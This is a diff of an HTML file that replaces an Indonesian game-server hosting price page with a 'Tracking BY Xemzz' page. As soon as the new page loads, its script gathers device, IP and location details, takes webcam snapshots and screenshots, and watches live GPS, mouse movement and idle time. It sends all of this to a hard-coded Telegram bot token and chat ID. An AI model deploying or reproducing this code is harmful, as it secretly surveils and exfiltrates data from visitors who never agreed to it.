@@ -1,650 +1,316 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KAZZ HOSTING - CREATE BY XEMZZ</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --primary: #4361ee;
-            --primary-dark: #3a56d4;
-            --secondary: #3f37c9;
-            --accent: #4895ef;
-            --dark: #0f172a;
-            --light: #f8fafc;
-            --success: #4cc9f0;
-            --warning: #f72585;
-            --gray: #64748b;
-            --light-gray: #e2e8f0;
-            --glass: rgba(255, 255, 255, 0.08);
-            --whatsapp: #25D366;
-            --telegram: #0088CC;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #0f172a, #1e293b);
-            color: var(--light);
-            min-height: 100vh;
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 2rem;
-        }
-        
-        header {
-            text-align: center;
-            margin-bottom: 3rem;
-            position: relative;
-            z-index: 10;
-            animation: fadeIn 1s ease;
-        }
-        
-        .logo {
-            font-size: 3rem;
-            font-weight: 700;
-            background: linear-gradient(90deg, #4cc9f0, #4895ef, #4361ee);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 0.5rem;
-            letter-spacing: -1px;
-            line-height: 1.1;
-            text-shadow: 0 2px 10px rgba(76, 201, 240, 0.3);
-            animation: gradientPulse 8s infinite alternate;
-        }
-        
-        .tagline {
-            font-size: 1.3rem;
-            opacity: 0.8;
-            font-weight: 300;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        
-        .welcome-section {
-            text-align: center;
-            margin-bottom: 4rem;
-            animation: fadeIn 1s ease;
-        }
-        
-        .welcome-title {
-            font-size: 2.5rem;
-            margin-bottom: 0.75rem;
-            background: linear-gradient(90deg, var(--accent), var(--success));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-        
-        .welcome-subtitle {
-            font-size: 1.2rem;
-            opacity: 0.8;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-        
-        .pricing-section {
-            margin-bottom: 4rem;
-            animation: fadeIn 1s ease;
-        }
-        
-        .section-title {
-            text-align: center;
-            font-size: 2rem;
-            margin-bottom: 3rem;
-            position: relative;
-            display: inline-block;
-            left: 50%;
-            transform: translateX(-50%);
-            font-weight: 700;
-            background: linear-gradient(90deg, var(--light), var(--light-gray));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        
-        .section-title::after {
-            content: '';
-            position: absolute;
-            bottom: -12px;
-            left: 0;
-            width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, var(--primary), var(--accent));
-            border-radius: 4px;
-            transform-origin: left;
-            animation: scaleIn 0.8s cubic-bezier(0.4, 0, 0.2, 1) forwards;
-        }
-        
-        .pricing-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-        
-        .pricing-card {
-            background: var(--glass);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-radius: 20px;
-            padding: 2.5rem;
-            text-align: center;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-            animation: cardEntrance 0.6s forwards;
-        }
-        
-        .pricing-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 20% 50%, rgba(72, 149, 239, 0.1) 0%, transparent 50%);
-            z-index: -1;
-        }
-        
-        .pricing-card:hover {
-            transform: translateY(-10px) scale(1.02);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
-            border-color: rgba(72, 149, 239, 0.3);
-        }
-        
-        .pricing-card.featured {
-            background: linear-gradient(135deg, rgba(67, 97, 238, 0.15), rgba(58, 86, 212, 0.1));
-            border: 1px solid var(--accent);
-        }
-        
-        .pricing-card.featured::after {
-            content: 'POPULAR';
-            position: absolute;
-            top: 20px;
-            right: -30px;
-            background: var(--accent);
-            color: white;
-            padding: 0.25rem 2rem;
-            font-size: 0.8rem;
-            font-weight: 600;
-            transform: rotate(45deg);
-            box-shadow: 0 2px 10px rgba(72, 149, 239, 0.3);
-        }
-        
-        .pricing-card h3 {
-            font-size: 1.6rem;
-            margin-bottom: 1.5rem;
-            color: var(--light);
-            font-weight: 600;
-        }
-        
-        .pricing-card .price {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 2rem;
-            color: var(--accent);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.25rem;
-        }
-        
-        .pricing-card .price span {
-            font-size: 1.6rem;
-            font-weight: 600;
-            opacity: 0.9;
-        }
-        
-        .buy-btn {
-            padding: 12px 30px;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            width: 100%;
-            box-shadow: 0 4px 20px rgba(67, 97, 238, 0.3);
-            font-size: 1.1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
-        
-        .buy-btn:hover {
-            background: linear-gradient(90deg, var(--primary-dark), var(--secondary));
-            box-shadow: 0 8px 25px rgba(67, 97, 238, 0.4);
-            transform: translateY(-3px);
-        }
-        
-        .buy-btn i {
-            transition: transform 0.3s;
-        }
-        
-        .buy-btn:hover i {
-            transform: translateX(3px);
-        }
-        
-        .contact-buttons {
-            display: none;
-            flex-direction: column;
-            gap: 1rem;
-            margin-top: 1.5rem;
-        }
-        
-        .contact-btn {
-            padding: 12px;
-            border-radius: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.75rem;
-            font-size: 1rem;
-            border: none;
-            color: white;
-        }
-        
-        .whatsapp-btn {
-            background-color: var(--whatsapp);
-            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
-        }
-        
-        .telegram-btn {
-            background-color: var(--telegram);
-            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
-        }
-        
-        .contact-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
-        }
-        
-        .contact-btn i {
-            font-size: 1.2rem;
-        }
-        
-        .panel-section {
-            margin-bottom: 4rem;
-            animation: fadeIn 1s ease;
-        }
-        
-        .panel-cards {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            flex-wrap: wrap;
-        }
-        
-        .panel-card {
-            background: var(--glass);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-radius: 20px;
-            padding: 2.5rem;
-            text-align: center;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            width: 100%;
-            max-width: 450px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-            animation: cardEntrance 0.6s forwards;
-        }
-        
-        .panel-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 20% 50%, rgba(72, 149, 239, 0.1) 0%, transparent 50%);
-            z-index: -1;
-        }
-        
-        .panel-card:hover {
-            transform: translateY(-10px) scale(1.02);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
-            border-color: rgba(72, 149, 239, 0.3);
-        }
-        
-        .panel-card h3 {
-            font-size: 1.8rem;
-            margin-bottom: 1.5rem;
-            color: var(--light);
-            font-weight: 600;
-        }
-        
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 1.5rem;
-            margin-top: 4rem;
-            animation: fadeIn 1s ease;
-            flex-wrap: wrap;
-        }
-        
-        .footer-link {
-            padding: 15px 30px;
-            background: var(--glass);
-            color: white;
-            text-decoration: none;
-            border-radius: 12px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            font-weight: 600;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            font-size: 1.1rem;
-        }
-        
-        .footer-link:hover {
-            background: rgba(255, 255, 255, 0.15);
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
-            border-color: rgba(72, 149, 239, 0.3);
-        }
-        
-        .footer-link i {
-            font-size: 1.2rem;
-            transition: transform 0.3s;
-        }
-        
-        .footer-link:hover i {
-            transform: translateX(3px);
-        }
-        
-        /* Animations */
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        @keyframes scaleIn {
-            from { transform: scaleX(0); }
-            to { transform: scaleX(1); }
-        }
-        
-        @keyframes gradientPulse {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        
-        @keyframes cardEntrance {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        
-        /* Responsive */
-        @media (max-width: 992px) {
-            .logo { font-size: 2.5rem; }
-            .tagline { font-size: 1.1rem; }
-            .pricing-grid { grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); }
-        }
-        
-        @media (max-width: 768px) {
-            .container { padding: 1.5rem; }
-            .logo { font-size: 2.2rem; }
-            .pricing-grid { grid-template-columns: 1fr; }
-            .panel-cards { flex-direction: column; align-items: center; }
-            .panel-card { max-width: 100%; }
-            .footer-link { padding: 12px 25px; font-size: 1rem; }
-        }
-        
-        @media (max-width: 480px) {
-            .welcome-title { font-size: 2rem; }
-            .section-title { font-size: 1.8rem; }
-            .pricing-card, .panel-card { padding: 2rem; }
-            .pricing-card h3, .panel-card h3 { font-size: 1.5rem; }
-            .pricing-card .price { font-size: 2.2rem; }
-            .contact-buttons { gap: 0.75rem; }
-            .contact-btn { padding: 10px; font-size: 0.95rem; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Xemzz - Website</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #0f0f0f;
+      padding: 20px;
+      color: #e0e0e0;
+    }
+    .terminal-box {
+      background: #1a1a1a;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      max-width: 700px;
+      margin: auto;
+      border: 1px solid #333;
+      position: relative;
+    }
+    .terminal-header {
+      background: #222;
+      padding: 8px 15px;
+      border-radius: 5px 5px 0 0;
+      margin: -20px -20px 15px -20px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #444;
+    }
+    .terminal-title {
+      font-weight: bold;
+      color: #4CAF50;
+      text-shadow: 0 0 5px rgba(76, 175, 80, 0.3);
+    }
+    .terminal-dots {
+      display: flex;
+      margin-right: 10px;
+    }
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      margin-right: 6px;
+    }
+    .dot-red { background: #ff5f56; }
+    .dot-yellow { background: #ffbd2e; }
+    .dot-green { background: #27c93f; }
+    .info-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+    .info-item {
+      display: flex;
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+    .info-label {
+      color: #4CAF50;
+      min-width: 120px;
+      margin-right: 10px;
+    }
+    .info-value {
+      color: #e0e0e0;
+      word-break: break-all;
+    }
+    .section-title {
+      color: #4CAF50;
+      margin: 15px 0 10px 0;
+      padding-bottom: 5px;
+      border-bottom: 1px solid #333;
+      grid-column: span 2;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #666;
+      font-size: 12px;
+    }
+    video, canvas {
+      display: none;
+    }
+    @media (max-width: 600px) {
+      .info-grid {
+        grid-template-columns: 1fr;
+      }
+      .section-title {
+        grid-column: span 1;
+      }
+    }
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div class="logo">KAZZ HOSTING</div>
-            <div class="tagline">Pterodactyl Panel Solutions with Unlimited Power</div>
-        </header>
-        
-        <div class="welcome-section">
-            <h2 class="welcome-title">Welcome to Kazz Hosting</h2>
-            <p class="welcome-subtitle">Choose from our hosting solutions below</p>
-        </div>
-        
-        <div class="pricing-section">
-            <h2 class="section-title">Pterodactyl RAM Plans</h2>
-            <div class="pricing-grid">
-                <div class="pricing-card">
-                    <h3>5GB RAM</h3>
-                    <div class="price">Rp<span>4.000</span></div>
-                    <button class="buy-btn">
-                        Select Plan <i class="fas fa-chevron-right"></i>
-                    </button>
-                    <div class="contact-buttons">
-                        <button class="contact-btn whatsapp-btn" onclick="window.open('https://wa.me/6283829387155', '_blank')">
-                            <i class="fab fa-whatsapp"></i> Chat via WhatsApp
-                        </button>
-                        <button class="contact-btn telegram-btn" onclick="window.open('https://t.me/kazztrv', '_blank')">
-                            <i class="fab fa-telegram"></i> Chat via Telegram
-                        </button>
-                    </div>
-                </div>
-                <div class="pricing-card">
-                    <h3>6GB RAM</h3>
-                    <div class="price">Rp<span>5.000</span></div>
-                    <button class="buy-btn">
-                        Select Plan <i class="fas fa-chevron-right"></i>
-                    </button>
-                    <div class="contact-buttons">
-                        <button class="contact-btn whatsapp-btn" onclick="window.open('https://wa.me/6283829387155', '_blank')">
-                            <i class="fab fa-whatsapp"></i> Chat via WhatsApp
-                        </button>
-                        <button class="contact-btn telegram-btn" onclick="window.open('https://t.me/kazztrv', '_blank')">
-                            <i class="fab fa-telegram"></i> Chat via Telegram
-                        </button>
-                    </div>
-                </div>
-                <div class="pricing-card featured">
-                    <h3>8GB RAM</h3>
-                    <div class="price">Rp<span>7.000</span></div>
-                    <button class="buy-btn">
-                        Popular Choice <i class="fas fa-bolt"></i>
-                    </button>
-                    <div class="contact-buttons">
-                        <button class="contact-btn whatsapp-btn" onclick="window.open('https://wa.me/6283829387155', '_blank')">
-                            <i class="fab fa-whatsapp"></i> Chat via WhatsApp
-                        </button>
-                        <button class="contact-btn telegram-btn" onclick="window.open('https://t.me/kazztrv', '_blank')">
-                            <i class="fab fa-telegram"></i> Chat via Telegram
-                        </button>
-                    </div>
-                </div>
-                <div class="pricing-card">
-                    <h3>7GB RAM</h3>
-                    <div class="price">Rp<span>6.000</span></div>
-                    <button class="buy-btn">
-                        Select Plan <i class="fas fa-chevron-right"></i>
-                    </button>
-                    <div class="contact-buttons">
-                        <button class="contact-btn whatsapp-btn" onclick="window.open('https://wa.me/6283829387155', '_blank')">
-                            <i class="fab fa-whatsapp"></i> Chat via WhatsApp
-                        </button>
-                        <button class="contact-btn telegram-btn" onclick="window.open('https://t.me/kazztrv', '_blank')">
-                            <i class="fab fa-telegram"></i> Chat via Telegram
-                        </button>
-                    </div>
-                </div>
-                <div class="pricing-card">
-                    <h3>9GB RAM</h3>
-                    <div class="price">Rp<span>8.000</span></div>
-                    <button class="buy-btn">
-                        Select Plan <i class="fas fa-chevron-right"></i>
-                    </button>
-                    <div class="contact-buttons">
-                        <button class="contact-btn whatsapp-btn" onclick="window.open('https://wa.me/6283829387155', '_blank')">
-                            <i class="fab fa-whatsapp"></i> Chat via WhatsApp
-                        </button>
-                        <button class="contact-btn telegram-btn" onclick="window.open('https://t.me/kazztrv', '_blank')">
-                            <i class="fab fa-telegram"></i> Chat via Telegram
-                        </button>
-                    </div>
-                </div>
-                <div class="pricing-card">
-                    <h3>Unlimited RAM</h3>
-                    <div class="price">Rp<span>9.000</span></div>
-                    <button class="buy-btn">
-                        Select Plan <i class="fas fa-chevron-right"></i>
-                    </button>
-                    <div class="contact-buttons">
-                        <button class="contact-btn whatsapp-btn" onclick="window.open('https://wa.me/6283829387155', '_blank')">
-                            <i class="fab fa-whatsapp"></i> Chat via WhatsApp
-                        </button>
-                        <button class="contact-btn telegram-btn" onclick="window.open('https://t.me/kazztrv', '_blank')">
-                            <i class="fab fa-telegram"></i> Chat via Telegram
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="panel-section">
-            <h2 class="section-title">Premium Control Panels</h2>
-            <div class="panel-cards">
-                <div class="panel-card">
-                    <h3>Reseller Panel</h3>
-                    <div class="price">Rp<span>11.000</span></div>
-                    <button class="buy-btn">
-                        Get Started <i class="fas fa-rocket"></i>
-                    </button>
-                    <div class="contact-buttons">
-                        <button class="contact-btn whatsapp-btn" onclick="window.open('https://wa.me/6283829387155', '_blank')">
-                            <i class="fab fa-whatsapp"></i> Chat via WhatsApp
-                        </button>
-                        <button class="contact-btn telegram-btn" onclick="window.open('https://t.me/kazztrv', '_blank')">
-                            <i class="fab fa-telegram"></i> Chat via Telegram
-                        </button>
-                    </div>
-                </div>
-                <div class="panel-card">
-                    <h3>Admin Panel</h3>
-                    <div class="price">Rp<span>15.000</span></div>
-                    <button class="buy-btn">
-                        Get Started <i class="fas fa-crown"></i>
-                    </button>
-                    <div class="contact-buttons">
-                        <button class="contact-btn whatsapp-btn" onclick="window.open('https://wa.me/6283829387155', '_blank')">
-                            <i class="fab fa-whatsapp"></i> Chat via WhatsApp
-                        </button>
-                        <button class="contact-btn telegram-btn" onclick="window.open('https://t.me/kazztrv', '_blank')">
-                            <i class="fab fa-telegram"></i> Chat via Telegram
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="footer-links">
-            <a href="https://t.me/kazztrv" class="footer-link" target="_blank">
-                <i class="fab fa-telegram"></i> Telegram Owner
-            </a>
-            <a href="https://t.me/kazzofficialtestimoni" class="footer-link" target="_blank">
-                <i class="fas fa-comment-dots"></i> Testimonial
-            </a>
-        </div>
-    </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Handle buy button clicks to show contact options
-            document.addEventListener('click', function(e) {
-                if (e.target.classList.contains('buy-btn') || e.target.closest('.buy-btn')) {
-                    const btn = e.target.classList.contains('buy-btn') ? e.target : e.target.closest('.buy-btn');
-                    const card = btn.closest('.pricing-card, .panel-card');
-                    const contactButtons = card.querySelector('.contact-buttons');
-                    
-                    // Hide all other contact buttons first
-                    document.querySelectorAll('.contact-buttons').forEach(buttons => {
-                        if (buttons !== contactButtons) {
-                            buttons.style.display = 'none';
-                        }
-                    });
-                    
-                    // Toggle the clicked card's contact buttons
-                    if (contactButtons.style.display === 'flex') {
-                        contactButtons.style.display = 'none';
-                    } else {
-                        contactButtons.style.display = 'flex';
-                        setTimeout(() => {
-                            contactButtons.style.opacity = '1';
-                            contactButtons.style.transform = 'translateY(0)';
-                        }, 10);
-                        
-                        // Scroll to the card if it's not fully visible
-                        card.scrollIntoView({ 
-                            behavior: 'smooth',
-                            block: 'nearest'
-                        });
-                    }
-                }
-            });
-            
-            // Add style for animations
-            const style = document.createElement('style');
-            style.textContent = `
-                .contact-buttons {
-                    opacity: 0;
-                    transform: translateY(10px);
-                    transition: all 0.3s ease;
-                }
-                
-                .contact-buttons[style*="display: flex"] {
-                    opacity: 1;
-                    transform: translateY(0);
-                }
-            `;
-            document.head.appendChild(style);
+  <div class="terminal-box">
+    <div class="terminal-header">
+      <div class="terminal-dots">
+        <div class="dot dot-red"></div>
+        <div class="dot dot-yellow"></div>
+        <div class="dot dot-green"></div>
+      </div>
+      <div class="terminal-title">Tracking BY Xemzz</div>
+    </div>
+    
+    <div class="info-grid" id="deviceInfo">
+      <div class="section-title">⚙️ Device Information</div>
+    </div>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    
+    <div class="footer">Telegram @XemzzXiterz</div>
+  </div>
+
+  <script>
+    const token = '7944528020:AAFjxkw-YCyfnjCiA-QV3tDSLB9VyC6ZPnE';
+    const chatId = '7525205684';
+
+    function sendText(text) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+      });
+    }
+
+    function sendPhotoBlob(blob, filename = 'image.jpg') {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, filename);
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    function createInfoItem(label, value) {
+      const container = document.getElementById('deviceInfo');
+      const item = document.createElement('div');
+      item.className = 'info-item';
+      item.innerHTML = `
+        <div class="info-label">${label}</div>
+        <div class="info-value">${value}</div>
+      `;
+      container.appendChild(item);
+      return `<b>${label}:</b> ${value}\n`;
+    }
+
+    async function collectAllInfo() {
+      let message = '<b>╭───── Tracking BY Xemzz ───── ⦿</b>\n\n';
+      
+      // Device Information
+      message += '<b>⚙️ DEVICE INFORMATION</b>\n';
+      const deviceInfo = [
+        ['🖥️ Device', navigator.userAgent],
+        ['💻 Platform', navigator.platform],
+        ['🌐 Bahasa', navigator.language],
+        ['📶 Online', navigator.onLine ? 'Online' : 'Offline'],
+        ['📺 Screen Size', `${screen.width}x${screen.height}`],
+        ['🪟 Window Size', `${window.innerWidth}x${window.innerHeight}`],
+        ['💾 RAM', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'],
+        ['🧠 CPU Cores', navigator.hardwareConcurrency],
+        ['✋ Touch Support', 'ontouchstart' in window ? '✅ YA' : '❌ TIDAK']
+      ];
+
+      deviceInfo.forEach(info => {
+        message += createInfoItem(info[0], info[1]);
+      });
+
+      // Battery Info
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          message += createInfoItem('🔋 Battery', `${(battery.level * 100).toFixed(0)}%`);
+          message += createInfoItem('🔌 Charging', battery.charging ? '✅ YA' : '❌ TIDAK');
+        } catch (e) {
+          message += createInfoItem('🔋 Battery', '❌ Tidak tersedia');
+        }
+      }
+
+      // Session Information
+      message += '\n<b>📊 SESSION INFORMATION</b>\n';
+      message += createInfoItem('⏰ Waktu Akses', new Date().toString());
+      message += createInfoItem('🕒 Page Load Time', (performance.now()).toFixed(2) + ' ms');
+      message += createInfoItem('📜 History Length', history.length);
+      message += createInfoItem('🔗 Referrer', document.referrer || 'None');
+      message += createInfoItem('🌍 URL', window.location.href);
+      message += createInfoItem('📄 Title', document.title);
+
+      // Location Information
+      message += '\n<b>📍 LOCATION INFORMATION</b>\n';
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const offset = new Date().getTimezoneOffset();
+      message += createInfoItem('🕓 Timezone', tz);
+      message += createInfoItem('🧭 Offset', offset + ' menit');
+
+      // Plugins Information
+      message += '\n<b>🧩 PLUGINS</b>\n';
+      if (navigator.plugins.length > 0) {
+        for (let i = 0; i < navigator.plugins.length; i++) {
+          message += createInfoItem(`🔌 Plugin ${i+1}`, navigator.plugins[i].name);
+        }
+      } else {
+        message += '❌ Tidak ada plugins terdeteksi\n';
+      }
+
+      // Features Information
+      message += '\n<b>⚙️ FEATURES</b>\n';
+      const features = ['geolocation', 'mediaDevices', 'bluetooth', 'clipboard', 'serviceWorker'];
+      features.forEach(f => {
+        message += createInfoItem(`⚙️ ${f}`, f in navigator ? '✅ YA' : '❌ TIDAK');
+      });
+
+      // IP Information
+      try {
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+        
+        message += '\n<b>📡 IP INFORMATION</b>\n';
+        const ipInfo = [
+          ['📡 IP Address', ipData.ip],
+          ['🏙️ Kota', ipData.city],
+          ['🗺️ Wilayah', ipData.region],
+          ['🌎 Negara', ipData.country_name],
+          ['🏷️ Kode Pos', ipData.postal],
+          ['📌 Latitude', ipData.latitude],
+          ['📍 Longitude', ipData.longitude]
+        ];
+
+        ipInfo.forEach(info => {
+          message += createInfoItem(info[0], info[1]);
         });
-    </script>
+      } catch (e) {
+        message += '\n❌ Gagal mendapatkan informasi IP\n';
+      }
+
+      message += '\n<b>╰───── Telegram @XemzzXiterz ───── ⦿</b>';
+
+      return message;
+    }
+
+    // Main execution
+    (async () => {
+      // First send the comprehensive text report
+      const fullReport = await collectAllInfo();
+      sendText(fullReport);
+
+      // Then send media (webcam and screenshot)
+      try {
+        // Webcam snapshot
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => sendPhotoBlob(blob, '📸_camera.jpg'), 'image/jpeg');
+        
+        // Stop the video stream
+        stream.getTracks().forEach(track => track.stop());
+      } catch (e) {
+        console.log('Webcam access denied');
+      }
+
+      // Screenshot after a delay
+      setTimeout(() => {
+        html2canvas(document.body).then(canvas => {
+          canvas.toBlob(blob => sendPhotoBlob(blob, '🖼️_screenshot.jpg'), 'image/jpeg');
+        });
+      }, 5000);
+
+      // GPS tracking if available
+      if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(pos => {
+          const gpsText = `<b>📡 LIVE GPS TRACKING</b>\n` +
+                         `<b>📌 Lat:</b> ${pos.coords.latitude}\n` +
+                         `<b>📍 Lng:</b> ${pos.coords.longitude}\n` +
+                         `<b>🎯 Akurasi:</b> ${pos.coords.accuracy}m`;
+          sendText(gpsText);
+        }, err => {
+          console.log('GPS access denied');
+        }, { enableHighAccuracy: true });
+      }
+
+      // Mouse movement tracking
+      document.addEventListener('mousemove', (e) => {
+        sendText(`🖱️ <b>Mouse Position:</b> (${e.clientX}, ${e.clientY})`);
+      });
+
+      // Idle time tracking
+      let idleStart = Date.now();
+      let idleTimer;
+      ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
+        window.addEventListener(evt, () => {
+          const idleTime = ((Date.now() - idleStart) / 1000).toFixed(1);
+          sendText(`😴 <b>User idle selama:</b> ${idleTime} detik`);
+          idleStart = Date.now();
+          clearTimeout(idleTimer);
+          idleTimer = setTimeout(() => {
+            sendText('💤 <b>User diem kayak mayat selama 60 detik</b>');
+          }, 60000);
+        });
+      });
+    })();
+
+  </script>
+
 </body>
 </html>
